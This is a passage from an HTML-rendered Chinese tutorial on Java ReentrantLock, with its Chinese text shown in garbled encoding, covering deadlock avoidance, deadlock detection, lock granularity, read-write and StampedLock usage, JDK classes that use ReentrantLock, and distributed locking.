    <span class="hljs-comment">// æ‰€æœ‰æ–¹æ³•éƒ½æŒ‰A-&gt;Bé¡ºåºè·å–é”</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method1</span><span class="hljs-params">()</span> {
        lockA.lock();
        <span class="hljs-keyword">try</span> {
            lockB.lock();
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// ...</span>
            } <span class="hljs-keyword">finally</span> {
                lockB.unlock();
            }
        } <span class="hljs-keyword">finally</span> {
            lockA.unlock();
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method2</span><span class="hljs-params">()</span> {
        lockA.lock();  <span class="hljs-comment">// åŒæ ·å…ˆAåB</span>
        <span class="hljs-keyword">try</span> {
            lockB.lock();
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// ...</span>
            } <span class="hljs-keyword">finally</span> {
                lockB.unlock();
            }
        } <span class="hljs-keyword">finally</span> {
            lockA.unlock();
        }
    }
}
</code></pre>
<p><strong>ç­–ç•¥äºŒï¼šä½¿ç”¨tryLockè¶…æ—¶</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * ä½¿ç”¨tryLocké¿å…æ­»é”
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">safeTransfer</span><span class="hljs-params">(Account from, Account to, <span class="hljs-type">int</span> amount)</span> {
    <span class="hljs-type">long</span> <span class="hljs-variable">deadline</span> <span class="hljs-operator">=</span> System.nanoTime() + TimeUnit.SECONDS.toNanos(<span class="hljs-number">10</span>);
    
    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
        <span class="hljs-keyword">if</span> (from.lock.tryLock()) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-keyword">if</span> (to.lock.tryLock()) {
                    <span class="hljs-keyword">try</span> {
                        <span class="hljs-comment">// è½¬è´¦æ“ä½œ</span>
                        from.balance -= amount;
                        to.balance += amount;
                        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
                    } <span class="hljs-keyword">finally</span> {
                        to.lock.unlock();
                    }
                }
            } <span class="hljs-keyword">finally</span> {
                from.lock.unlock();
            }
        }
        
        <span class="hljs-comment">// æ£€æŸ¥è¶…æ—¶</span>
        <span class="hljs-keyword">if</span> (System.nanoTime() &gt;= deadline) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// è¶…æ—¶å¤±è´¥</span>
        }
        
        <span class="hljs-comment">// çŸ­æš‚ä¼‘çœ åé‡è¯•</span>
        Thread.<span class="hljs-keyword">yield</span>();
    }
}
</code></pre>
<p><strong>ç­–ç•¥ä¸‰ï¼šä½¿ç”¨lockInterruptibly</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * å¯ä¸­æ–­çš„è·å–é”ï¼Œæ”¯æŒå–æ¶ˆ
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">interruptibleMethod</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
    lock.lockInterruptibly();
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// ...</span>
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();
    }
}

<span class="hljs-comment">// æ£€æµ‹åˆ°æ­»é”æ—¶ï¼Œå¯ä»¥ä¸­æ–­çº¿ç¨‹æ¥æ‰“ç ´æ­»é”</span>
thread.interrupt();
</code></pre>
<h4 data-id="heading-153">2.4 æ­»é”æ£€æµ‹å·¥å…·</h4>
<p><strong>ä½¿ç”¨jstackæ£€æµ‹æ­»é”</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># è·å–çº¿ç¨‹è½¬å‚¨</span>
jstack &lt;pid&gt;
</code></pre>
<p><strong>ç¼–ç¨‹æ–¹å¼æ£€æµ‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * ä½¿ç”¨ThreadMXBeanæ£€æµ‹æ­»é”
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeadlockDetector</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ThreadMXBean</span> <span class="hljs-variable">threadMXBean</span> <span class="hljs-operator">=</span> ManagementFactory.getThreadMXBean();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">detectDeadlock</span><span class="hljs-params">()</span> {
        <span class="hljs-type">long</span>[] deadlockedThreads = threadMXBean.findDeadlockedThreads();
        
        <span class="hljs-keyword">if</span> (deadlockedThreads != <span class="hljs-literal">null</span>) {
            ThreadInfo[] threadInfos = threadMXBean.getThreadInfo(deadlockedThreads);
            
            System.err.println(<span class="hljs-string">"æ£€æµ‹åˆ°æ­»é”ï¼æ¶‰åŠçš„çº¿ç¨‹ï¼š"</span>);
            <span class="hljs-keyword">for</span> (ThreadInfo info : threadInfos) {
                System.err.println(info.getThreadName() + 
                    <span class="hljs-string">" ç­‰å¾…é”: "</span> + info.getLockName() +
                    <span class="hljs-string">" æŒæœ‰è€…: "</span> + info.getLockOwnerName());
            }
        }
    }
    
    <span class="hljs-comment">// å®šæœŸæ£€æµ‹</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">startMonitor</span><span class="hljs-params">()</span> {
        <span class="hljs-type">ScheduledExecutorService</span> <span class="hljs-variable">scheduler</span> <span class="hljs-operator">=</span> Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleAtFixedRate(<span class="hljs-built_in">this</span>::detectDeadlock, <span class="hljs-number">10</span>, <span class="hljs-number">10</span>, TimeUnit.SECONDS);
    }
}
</code></pre>
<hr/>
<h3 data-id="heading-154">3. æ€§èƒ½ä¼˜åŒ–å»ºè®®</h3>
<h4 data-id="heading-155">3.1 å‡å°é”ç²’åº¦</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * ç²—ç²’åº¦é”ï¼šæ•´ä¸ªæ–¹æ³•åŠ é”
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CoarseGrained</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-keyword">private</span> Map&lt;String, Object&gt; cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
    
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getData</span><span class="hljs-params">(String key)</span> {
        lock.lock();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Object</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> cache.get(key);
            <span class="hljs-keyword">if</span> (data == <span class="hljs-literal">null</span>) {
                data = loadFromDB(key);  <span class="hljs-comment">// è€—æ—¶IOæ“ä½œä¹Ÿè¢«é”ä½</span>
                cache.put(key, data);
            }
            <span class="hljs-keyword">return</span> data;
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
}

<span class="hljs-comment">/**
 * ç»†ç²’åº¦é”ï¼šåªé”å¿…è¦éƒ¨åˆ†
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FineGrained</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-keyword">private</span> Map&lt;String, Object&gt; cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
    
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getData</span><span class="hljs-params">(String key)</span> {
        <span class="hljs-comment">// å…ˆæ£€æŸ¥ç¼“å­˜ï¼ˆéœ€è¦é”ï¼‰</span>
        lock.lock();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Object</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> cache.get(key);
            <span class="hljs-keyword">if</span> (data != <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">return</span> data;
            }
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
        
        <span class="hljs-comment">// ç¼“å­˜æœªå‘½ä¸­ï¼ŒåŠ è½½æ•°æ®ï¼ˆä¸éœ€è¦é”ï¼‰</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> loadFromDB(key);
        
        <span class="hljs-comment">// æ›´æ–°ç¼“å­˜ï¼ˆéœ€è¦é”ï¼‰</span>
        lock.lock();
        <span class="hljs-keyword">try</span> {
            cache.putIfAbsent(key, data);
            <span class="hljs-keyword">return</span> cache.get(key);
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
    }
}
</code></pre>
<h4 data-id="heading-156">3.2 å‡å°‘é”æŒæœ‰æ—¶é—´</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * é•¿æ—¶é—´æŒæœ‰é”
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">longHold</span><span class="hljs-params">()</span> {
    lock.lock();
    <span class="hljs-keyword">try</span> {
        prepareData();     <span class="hljs-comment">// å‡†å¤‡æ•°æ®ï¼ˆä¸éœ€è¦é”ï¼‰</span>
        processData();     <span class="hljs-comment">// å¤„ç†æ•°æ®ï¼ˆéœ€è¦é”ï¼‰</span>
        saveResult();      <span class="hljs-comment">// ä¿å­˜ç»“æœï¼ˆä¸éœ€è¦é”ï¼‰</span>
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();
    }
}

<span class="hljs-comment">/**
 * åªåœ¨å¿…è¦æ—¶æŒæœ‰é”
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shortHold</span><span class="hljs-params">()</span> {
    <span class="hljs-type">Object</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> prepareData();  <span class="hljs-comment">// å‡†å¤‡æ•°æ®ï¼ˆé”å¤–ï¼‰</span>
    
    lock.lock();
    <span class="hljs-keyword">try</span> {
        processData(data);  <span class="hljs-comment">// å¤„ç†æ•°æ®ï¼ˆé”å†…ï¼‰</span>
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();
    }
    
    saveResult();  <span class="hljs-comment">// ä¿å­˜ç»“æœï¼ˆé”å¤–ï¼‰</span>
}
</code></pre>
<h4 data-id="heading-157">3.3 ä½¿ç”¨è¯»å†™é”</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * è¯»å¤šå†™å°‘åœºæ™¯ä½¿ç”¨ReadWriteLock
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReadWriteOptimization</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantReadWriteLock</span> <span class="hljs-variable">rwLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantReadWriteLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ReentrantReadWriteLock.<span class="hljs-type">ReadLock</span> <span class="hljs-variable">readLock</span> <span class="hljs-operator">=</span> rwLock.readLock();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ReentrantReadWriteLock.<span class="hljs-type">WriteLock</span> <span class="hljs-variable">writeLock</span> <span class="hljs-operator">=</span> rwLock.writeLock();
    
    <span class="hljs-keyword">private</span> Map&lt;String, Object&gt; data = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
    
    <span class="hljs-comment">// è¯»æ“ä½œï¼šå¤šçº¿ç¨‹å¯å¹¶å‘</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">read</span><span class="hljs-params">(String key)</span> {
        readLock.lock();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">return</span> data.get(key);
        } <span class="hljs-keyword">finally</span> {
            readLock.unlock();
        }
    }
    
    <span class="hljs-comment">// å†™æ“ä½œï¼šç‹¬å </span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">write</span><span class="hljs-params">(String key, Object value)</span> {
        writeLock.lock();
        <span class="hljs-keyword">try</span> {
            data.put(key, value);
        } <span class="hljs-keyword">finally</span> {
            writeLock.unlock();
        }
    }
}
</code></pre>
<h4 data-id="heading-158">3.4 é¿å…é”ç«äº‰</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * ä½¿ç”¨ThreadLocalé¿å…é”ç«äº‰
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadLocalOptimization</span> {
    
    <span class="hljs-comment">// æ¯ä¸ªçº¿ç¨‹æœ‰è‡ªå·±çš„SimpleDateFormatï¼Œæ— éœ€åŒæ­¥</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ThreadLocal&lt;SimpleDateFormat&gt; dateFormat = 
        ThreadLocal.withInitial(() -&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(<span class="hljs-string">"yyyy-MM-dd"</span>));
    
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">format</span><span class="hljs-params">(Date date)</span> {
        <span class="hljs-keyword">return</span> dateFormat.get().format(date);  <span class="hljs-comment">// æ— é”</span>
    }
}
</code></pre>
<h4 data-id="heading-159">3.5 å…¬å¹³é”vséå…¬å¹³é”é€‰æ‹©</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * æ€§èƒ½å¯¹æ¯”
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FairnessPerformance</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-type">int</span> <span class="hljs-variable">threadCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;
        <span class="hljs-type">int</span> <span class="hljs-variable">iterations</span> <span class="hljs-operator">=</span> <span class="hljs-number">100000</span>;
        
        <span class="hljs-comment">// éå…¬å¹³é”æµ‹è¯•</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">unfairTime</span> <span class="hljs-operator">=</span> testLock(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>(<span class="hljs-literal">false</span>), threadCount, iterations);
        System.out.println(<span class="hljs-string">"éå…¬å¹³é”è€—æ—¶: "</span> + unfairTime + <span class="hljs-string">"ms"</span>);
        
        <span class="hljs-comment">// å…¬å¹³é”æµ‹è¯•</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">fairTime</span> <span class="hljs-operator">=</span> testLock(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>(<span class="hljs-literal">true</span>), threadCount, iterations);
        System.out.println(<span class="hljs-string">"å…¬å¹³é”è€—æ—¶: "</span> + fairTime + <span class="hljs-string">"ms"</span>);
        
        <span class="hljs-comment">// é€šå¸¸å…¬å¹³é”ä¼šæ…¢å¾ˆå¤š</span>
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">testLock</span><span class="hljs-params">(ReentrantLock lock, <span class="hljs-type">int</span> threads, <span class="hljs-type">int</span> iterations)</span> 
            <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-comment">// æµ‹è¯•ä»£ç ...</span>
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    }
}
</code></pre>
<p><strong>ç»“è®º</strong>ï¼šéå…¬å¹³é”é€šå¸¸æ¯”å…¬å¹³é”å¿«å¾ˆå¤šï¼ˆå¯èƒ½å¿«10å€ä»¥ä¸Šï¼‰ï¼Œé™¤éæœ‰ç‰¹æ®Šå…¬å¹³æ€§è¦æ±‚ï¼Œå¦åˆ™ä½¿ç”¨é»˜è®¤çš„éå…¬å¹³é”ã€‚</p>
<hr/>
<h3 data-id="heading-160">4. é”é€‰å‹æŒ‡å—</h3>
<h4 data-id="heading-161">4.1 é”æœºåˆ¶å¯¹æ¯”</h4>



































<table><thead><tr><th align="left">é”æœºåˆ¶</th><th align="left">ç‰¹ç‚¹</th><th align="left">é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td align="left"><strong>synchronized</strong></td><td align="left">ç®€å•ã€è‡ªåŠ¨é‡Šæ”¾ã€JVMä¼˜åŒ–</td><td align="left">ç®€å•åŒæ­¥ï¼Œä½ç«äº‰</td></tr><tr><td align="left"><strong>ReentrantLock</strong></td><td align="left">åŠŸèƒ½ä¸°å¯Œã€çµæ´»</td><td align="left">éœ€è¦é«˜çº§ç‰¹æ€§</td></tr><tr><td align="left"><strong>ReadWriteLock</strong></td><td align="left">è¯»å†™åˆ†ç¦»</td><td align="left">è¯»å¤šå†™å°‘</td></tr><tr><td align="left"><strong>StampedLock</strong></td><td align="left">ä¹è§‚è¯»ã€é«˜æ€§èƒ½</td><td align="left">è¯»å¤šå†™å°‘ï¼Œè¿½æ±‚æ€§èƒ½</td></tr><tr><td align="left"><strong>AtomicXxx</strong></td><td align="left">æ— é”CAS</td><td align="left">ç®€å•åŸå­æ“ä½œ</td></tr></tbody></table>
<h4 data-id="heading-162">4.2 é€‰å‹å†³ç­–æ ‘</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aa700f5f57d14cce90d8daf250a0db05~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=7rAsB5fvg1wD5cTcvdzzWAUoOHc%3D" alt="lock-selection-tree.drawio.png" loading="lazy"/></p>
<h4 data-id="heading-163">4.3 ReentrantLock vs StampedLock</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * StampedLockç¤ºä¾‹ï¼ˆJDK 8+ï¼‰
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StampedLockExample</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">StampedLock</span> <span class="hljs-variable">sl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StampedLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> x, y;
    
    <span class="hljs-comment">// å†™é”</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">move</span><span class="hljs-params">(<span class="hljs-type">double</span> deltaX, <span class="hljs-type">double</span> deltaY)</span> {
        <span class="hljs-type">long</span> <span class="hljs-variable">stamp</span> <span class="hljs-operator">=</span> sl.writeLock();
        <span class="hljs-keyword">try</span> {
            x += deltaX;
            y += deltaY;
        } <span class="hljs-keyword">finally</span> {
            sl.unlockWrite(stamp);
        }
    }
    
    <span class="hljs-comment">// ä¹è§‚è¯»ï¼ˆæ— é”ï¼‰</span>
    <span class="hljs-type">double</span> <span class="hljs-title function_">distanceFromOrigin</span><span class="hljs-params">()</span> {
        <span class="hljs-type">long</span> <span class="hljs-variable">stamp</span> <span class="hljs-operator">=</span> sl.tryOptimisticRead();  <span class="hljs-comment">// è·å–ä¹è§‚è¯»æ ‡è®°</span>
        <span class="hljs-type">double</span> <span class="hljs-variable">currentX</span> <span class="hljs-operator">=</span> x, currentY = y;
        
        <span class="hljs-keyword">if</span> (!sl.validate(stamp)) {  <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦è¢«å†™å…¥</span>
            <span class="hljs-comment">// ä¹è§‚è¯»å¤±è´¥ï¼Œå‡çº§ä¸ºæ‚²è§‚è¯»</span>
            stamp = sl.readLock();
            <span class="hljs-keyword">try</span> {
                currentX = x;
                currentY = y;
            } <span class="hljs-keyword">finally</span> {
                sl.unlockRead(stamp);
            }
        }
        
        <span class="hljs-keyword">return</span> Math.sqrt(currentX * currentX + currentY * currentY);
    }
}
</code></pre>
<p><strong>StampedLockçš„ä¼˜åŠ¿</strong>ï¼š</p>
<ul>
<li>ä¹è§‚è¯»ä¸é˜»å¡å†™</li>
<li>è¯»å¤šå†™å°‘æ—¶æ€§èƒ½æ›´å¥½</li>
</ul>
<p><strong>StampedLockçš„é™åˆ¶</strong>ï¼š</p>
<ul>
<li>ä¸å¯é‡å…¥</li>
<li>ä¸æ”¯æŒCondition</li>
<li>ä½¿ç”¨æ›´å¤æ‚</li>
</ul>
<h3 data-id="heading-164">5. JDKä¸­ReentrantLockçš„åº”ç”¨</h3>
<h4 data-id="heading-165">5.1 å…¸å‹åº”ç”¨åœºæ™¯</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * JDKä¸­ä½¿ç”¨ReentrantLockçš„ç±»
 */</span>

<span class="hljs-comment">// 1. ArrayBlockingQueue - æœ‰ç•Œé˜»å¡é˜Ÿåˆ—</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ArrayBlockingQueue</span>&lt;E&gt; {
    <span class="hljs-keyword">final</span> ReentrantLock lock;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Condition notEmpty;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Condition notFull;
    <span class="hljs-comment">// ä½¿ç”¨ReentrantLockå®ç°put/takeçš„é˜»å¡ç­‰å¾…</span>
}

<span class="hljs-comment">// 2. LinkedBlockingQueue - é“¾è¡¨é˜»å¡é˜Ÿåˆ—</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;E&gt; {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">takeLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">putLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-comment">// åŒé”æé«˜å¹¶å‘åº¦</span>
}

<span class="hljs-comment">// 3. ThreadPoolExecutor - çº¿ç¨‹æ± </span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadPoolExecutor</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">mainLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-comment">// ä¿æŠ¤workersé›†åˆçš„è®¿é—®</span>
}

<span class="hljs-comment">// 4. CyclicBarrier - å¾ªç¯å±éšœ</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CyclicBarrier</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Condition</span> <span class="hljs-variable">trip</span> <span class="hljs-operator">=</span> lock.newCondition();
    <span class="hljs-comment">// ä½¿ç”¨Conditionå®ç°ç­‰å¾…/å”¤é†’</span>
}

<span class="hljs-comment">// 5. PrintWriter (æŸäº›å®ç°)</span>
<span class="hljs-comment">// 6. StampedLock (å†…éƒ¨ä½¿ç”¨)</span>
</code></pre>
<h4 data-id="heading-166">5.2 ä¸ºä»€ä¹ˆè¿™äº›ç±»é€‰æ‹©ReentrantLock</h4>

























<table><thead><tr><th align="left">ç±»</th><th align="left">é€‰æ‹©ReentrantLockçš„åŸå› </th></tr></thead><tbody><tr><td align="left">ArrayBlockingQueue</td><td align="left">éœ€è¦å¤šä¸ªConditionï¼ˆnotEmpty, notFullï¼‰</td></tr><tr><td align="left">LinkedBlockingQueue</td><td align="left">éœ€è¦åˆ†ç¦»çš„é”æé«˜å¹¶å‘</td></tr><tr><td align="left">ThreadPoolExecutor</td><td align="left">éœ€è¦tryLocké¿å…æ­»é”</td></tr><tr><td align="left">CyclicBarrier</td><td align="left">éœ€è¦Conditionå®ç°ç­‰å¾…</td></tr></tbody></table>
<h3 data-id="heading-167">6. åºåˆ—åŒ–ä¸åˆ†å¸ƒå¼</h3>
<h4 data-id="heading-168">6.1 ReentrantLockä¸å¯åºåˆ—åŒ–</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * ReentrantLockçš„åºåˆ—åŒ–é—®é¢˜
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializationIssue</span> {
    
    <span class="hljs-comment">// ReentrantLockæ²¡æœ‰å®ç°Serializableæ¥å£</span>
    <span class="hljs-comment">// private final ReentrantLock lock = new ReentrantLock();</span>
    
    <span class="hljs-comment">/**
     * å¦‚æœç±»éœ€è¦åºåˆ—åŒ–ï¼Œé”å­—æ®µéœ€è¦ç‰¹æ®Šå¤„ç†
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializableWithLock</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> {
        
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;
        
        <span class="hljs-comment">// ä½¿ç”¨transientï¼Œä¸åºåˆ—åŒ–é”</span>
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
        
        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> data;
        
        <span class="hljs-comment">// ååºåˆ—åŒ–æ—¶é‡æ–°åˆ›å»ºé”</span>
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> 
                <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException {
            in.defaultReadObject();
            lock = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();  <span class="hljs-comment">// é‡æ–°åˆ›å»º</span>
        }
        
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
            lock.lock();
            <span class="hljs-keyword">try</span> {
                data++;
            } <span class="hljs-keyword">finally</span> {
                lock.unlock();
            }
        }
    }
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆReentrantLockä¸å¯åºåˆ—åŒ–ï¼Ÿ</strong></p>
<ol>
<li><strong>é”çŠ¶æ€æ˜¯è¿è¡Œæ—¶çŠ¶æ€</strong>ï¼šåºåˆ—åŒ–åå†ååºåˆ—åŒ–ï¼ŒåŸæ¥çš„é”çŠ¶æ€æ²¡æœ‰æ„ä¹‰</li>
<li><strong>çº¿ç¨‹ç»‘å®š</strong>ï¼šé”ä¸ç‰¹å®šçš„çº¿ç¨‹å…³è”ï¼Œåºåˆ—åŒ–åçº¿ç¨‹å·²ä¸å­˜åœ¨</li>
<li><strong>è®¾è®¡é€‰æ‹©</strong>ï¼šDoug Leaè®¤ä¸ºé”ä¸åº”è¯¥è¢«åºåˆ—åŒ–</li>
</ol>
<h4 data-id="heading-169">6.2 åˆ†å¸ƒå¼ç¯å¢ƒçš„çº¿ç¨‹å®‰å…¨</h4>
<p><strong>ReentrantLockåªèƒ½ä¿è¯å•JVMå†…çš„çº¿ç¨‹å®‰å…¨</strong>ï¼Œåˆ†å¸ƒå¼ç¯å¢ƒéœ€è¦åˆ†å¸ƒå¼é”ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * åˆ†å¸ƒå¼ç¯å¢ƒä¸‹çš„é”æ–¹æ¡ˆ
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DistributedLockOptions</span> {
    
    <span class="hljs-comment">/**
     * æ–¹æ¡ˆ1ï¼šåŸºäºRedisçš„åˆ†å¸ƒå¼é”
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">redisLock</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// ä½¿ç”¨Redisson</span>
        <span class="hljs-comment">// RLock lock = redissonClient.getLock("myLock");</span>
        <span class="hljs-comment">// lock.lock();</span>
        <span class="hljs-comment">// try { ... } finally { lock.unlock(); }</span>
    }
    
    <span class="hljs-comment">/**
     * æ–¹æ¡ˆ2ï¼šåŸºäºZooKeeperçš„åˆ†å¸ƒå¼é”
     */</span>
